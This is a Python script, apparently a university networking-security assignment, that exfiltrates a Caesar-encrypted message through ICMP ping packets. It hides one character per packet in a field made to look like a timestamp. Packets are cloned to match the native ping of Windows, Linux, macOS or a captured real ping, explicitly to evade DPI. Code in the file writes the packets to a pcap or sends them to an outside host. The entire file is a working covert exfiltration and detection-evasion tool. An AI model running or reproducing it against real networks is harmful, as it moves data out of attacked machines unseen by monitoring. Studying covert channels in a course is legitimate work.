"""Actividad 2 - Modo stealth (exfiltracion via ICMP tipo ping).

Toma un mensaje, lo cifra con Cesar (Actividad 1) y lo transmite
caracter-por-caracter dentro de paquetes ICMP Echo Request que imitan al
'ping' por defecto del SISTEMA OPERATIVO de la maquina atacada (Windows,
Linux o macOS), de modo que un DPI que compare el trafico contra un ping
real de ese SO no encuentre diferencias.

Como funciona la evasion (ver perfiles.py):
  Se replica la firma exacta del ping nativo (TTL + payload). El caracter
  secreto se esconde en el timestamp (campo que varia entre pings), dejando
  el patron deterministico intacto -> el DPI no gatilla alarma.
  El fin de mensaje se marca con el caracter 'b' (enunciado).

Uso:
  # Elegir SO objetivo y escribir a pcap (NO requiere root):
  python3 stealth.py "Texto secreto" 3 --os macos --pcap salida.pcap

  # Si no se indica --os, se pregunta interactivamente.

  # Clonar EXACTAMENTE un ping real capturado (lo mas seguro, cualquier SO):
  python3 stealth.py "Texto secreto" 3 --plantilla real.pcap --pcap salida.pcap

  # Enviar de verdad por la red (requiere privilegios):
  sudo python3 stealth.py "Texto secreto" 3 --os linux --enviar --destino 8.8.8.8
"""
import argparse
import time

from scapy.all import IP, ICMP, Raw, wrpcap, send, rdpcap

from cesar import cifrar_cesar
import perfiles

SENTINEL = "b"          # marca de fin de mensaje (enunciado)
PING_ID = 0x1234        # identificador constante durante una "sesion" de ping


def payload_stealth(caracter, so=None, plantilla=None):
    """Construye el payload de un ping real con el caracter secreto oculto.

    - Si hay 'plantilla' (payload de un ping real capturado), se clona EXACTO
      y solo se sobrescribe el offset 0. Calza con cualquier SO.
    - Si no, se usa el perfil del 'so' indicado (windows/linux/macos).
    """
    if plantilla is not None:
        data = bytearray(plantilla)
        offset = 0
    else:
        data = bytearray(perfiles.payload_base(so))
        offset = perfiles.PERFILES[so]["covert_offset"]
    data[offset] = ord(caracter)       # <-- canal encubierto
    return bytes(data)


def elegir_echo_request(paquetes, preferida=56):
    """Elige el Echo Request que parece un 'ping' de usuario.

    macOS/Windows generan ICMP echo grandes de sistema (sondas de red de ~1300
    bytes). Este selector prefiere el payload de tamano 'preferida' (56 por
    defecto = ping estandar) para no confundirlo con esas sondas."""
    reqs = [p for p in paquetes if ICMP in p and p[ICMP].type == 8 and Raw in p]
    if not reqs:
        return None
    por_tam = {}
    for p in reqs:
        por_tam.setdefault(len(bytes(p[Raw].load)), p)
    tamanos = sorted(por_tam)
    if len(tamanos) > 1:
        print(f"[i] Echo requests encontrados (tamanos de data): {tamanos} bytes")
    if preferida in por_tam:
        return por_tam[preferida]
    menor = tamanos[0]
    print(f"[!] No hay payload de {preferida}B; uso el mas chico ({menor}B). "
          f"Si es una sonda de sistema, recaptura con: tcpdump ... 'icmp and less 100'")
    return por_tam[menor]


def cargar_plantilla(pcap_path, preferida=56):
    """Extrae (payload, ttl, id) del Echo Request de usuario de un pcap."""
    pkt = elegir_echo_request(rdpcap(pcap_path), preferida)
    if pkt is None:
        raise ValueError(f"No se encontro ningun Echo Request en {pcap_path}")
    return bytes(pkt[Raw].load), pkt[IP].ttl, pkt[ICMP].id


def construir_paquetes(mensaje_cifrado, destino, so=None, plantilla=None,
                       ttl=64, icmp_id=PING_ID):
    """Lista de paquetes ICMP (uno por caracter + sentinela)."""
    paquetes = []
    for i, caracter in enumerate(mensaje_cifrado + SENTINEL):
        pkt = (
            IP(dst=destino, ttl=ttl)
            / ICMP(type=8, id=icmp_id, seq=i)
            / Raw(load=payload_stealth(caracter, so=so, plantilla=plantilla))
        )
        paquetes.append(pkt)
    return paquetes


def mostrar_campos(titulo, pkt, ts_len):
    """Imprime los campos relevantes de un paquete, estilo Wireshark."""
    icmp = pkt[ICMP]
    data = bytes(pkt[Raw].load)
    print(f"\n=== {titulo} ===")
    print(f"  IP TTL          : {pkt[IP].ttl}")
    print(f"  ICMP type       : {icmp.type} (Echo Request)")
    print(f"  ICMP code       : {icmp.code}")
    print(f"  ICMP id         : 0x{icmp.id:04x}")
    print(f"  ICMP seq        : {icmp.seq}")
    print(f"  data length     : {len(data)} bytes")
    if ts_len:
        print(f"  data[0:{ts_len}] timestamp : {data[:ts_len].hex(' ')}")
        print(f"  data[{ts_len}:] patron    : {data[ts_len:].hex(' ')}")
    else:
        print(f"  data (fijo)     : {data.hex(' ')}  ({data!r})")


def pedir_so():
    print("Sistema operativo de la maquina atacada:")
    print("  1) Windows   2) Linux   3) macOS")
    opciones = {"1": "windows", "2": "linux", "3": "macos"}
    while True:
        sel = input("Elija 1/2/3 (o escriba windows/linux/macos): ").strip().lower()
        if sel in opciones:
            return opciones[sel]
        try:
            return perfiles.normalizar(sel)
        except ValueError:
            print("  Opcion invalida, intente de nuevo.")


def main():
    p = argparse.ArgumentParser(description="Exfiltracion stealth via ICMP (ping).")
    p.add_argument("mensaje", help="Mensaje en claro a exfiltrar")
    p.add_argument("corrimiento", type=int, help="Corrimiento Cesar")
    p.add_argument("--os", dest="so", help="SO de la maquina atacada: windows | linux | macos")
    p.add_argument("--plantilla", help="pcap de un ping real a clonar (sobrescribe --os)")
    p.add_argument("--destino", default="8.8.8.8", help="IP destino (def: 8.8.8.8)")
    p.add_argument("--pcap", help="Guardar los paquetes en un archivo .pcap")
    p.add_argument("--enviar", action="store_true", help="Enviar por la red (requiere root)")
    args = p.parse_args()

    cifrado = cifrar_cesar(args.mensaje, args.corrimiento)
    print(f"[+] Mensaje en claro : {args.mensaje}")
    print(f"[+] Corrimiento      : {args.corrimiento}")
    print(f"[+] Mensaje cifrado  : {cifrado}")
    print(f"[+] Se transmite     : {cifrado + SENTINEL!r}  (ultimo = sentinela '{SENTINEL}')")

    # --- Determinar el molde: plantilla real (mejor) o perfil por SO ---------
    plantilla = None
    so = None
    if args.plantilla:
        plantilla, ttl, icmp_id = cargar_plantilla(args.plantilla)
        ref_payload = plantilla
        ts_len = 0                      # no sabemos el largo del ts; se muestra todo
        print(f"[+] Molde            : ping real clonado de {args.plantilla}")
        print(f"                        (TTL={ttl}, id=0x{icmp_id:04x}, {len(plantilla)} bytes)")
    else:
        so = perfiles.normalizar(args.so) if args.so else pedir_so()
        perfil = perfiles.PERFILES[so]
        ttl = perfil["ttl"]
        icmp_id = PING_ID
        ref_payload = perfiles.payload_base(so)
        ts_len = perfil["ts_len"]
        print(f"[+] SO atacado       : {so}  (TTL={ttl}, patron desde offset {perfil['patron_offset']})")
        print(f"[+] Nota de sigilo   : {perfil['nota']}")
        if not perfil["sigilo_real"]:
            print("    *** ADVERTENCIA: este SO no tiene timestamp; el canal es detectable.")

    # --- Construir paquetes --------------------------------------------------
    paquetes = construir_paquetes(cifrado, args.destino, so=so, plantilla=plantilla,
                                  ttl=ttl, icmp_id=icmp_id)

    # --- Demostracion: ping real vs nuestro paquete --------------------------
    ping_real = IP(dst=args.destino, ttl=ttl) / ICMP(type=8, id=icmp_id, seq=99) / Raw(load=ref_payload)
    mostrar_campos("PING REAL (referencia)", ping_real, ts_len)
    mostrar_campos(f"NUESTRO PAQUETE (caracter '{cifrado[0]}')", paquetes[0], ts_len)

    # El patron deterministico debe ser identico al ping real.
    if ts_len or plantilla is not None:
        reg = slice(ts_len, None) if ts_len else slice(1, None)  # excluye covert
        igual = bytes(ping_real[Raw].load)[reg] == bytes(paquetes[0][Raw].load)[reg]
        print(f"\n[+] Patron deterministico identico al ping real: {igual}"
              f"  -> {'DPI no gatilla alarma' if igual else 'REVISAR: podria detectarse'}")

    if args.pcap:
        wrpcap(args.pcap, paquetes)
        print(f"\n[+] {len(paquetes)} paquetes escritos en {args.pcap} (abrir en Wireshark)")

    if args.enviar:
        print(f"\n[+] Enviando {len(paquetes)} paquetes ICMP a {args.destino} ...")
        for pkt in paquetes:
            send(pkt, verbose=False)
            time.sleep(1)      # 1 s entre pings, como el ping real por defecto
        print("[+] Envio completado")


if __name__ == "__main__":
    main()
